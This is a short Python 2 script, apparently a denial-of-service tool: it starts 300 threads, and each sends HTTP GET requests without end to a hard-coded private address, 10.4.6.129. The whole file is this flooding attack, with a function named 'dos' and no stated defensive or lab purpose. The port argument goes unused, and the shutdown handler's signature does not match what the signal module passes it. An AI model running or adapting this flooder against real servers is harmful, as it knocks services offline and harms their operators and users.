import requests, thread, signal, sys, os
from time import sleep
from time import time

def dos(target, destport):
	while True:
		print str(int(time())) + ": Sending request"
		requests.get("http://" + target + "/")

def shutdown():
	sys.exit(0)

for _ in range(0, 300):
	thread.start_new_thread(dos, ("10.4.6.129", "8080"))

signal.signal(signal.SIGINT, shutdown)

while True:
	sleep(1)
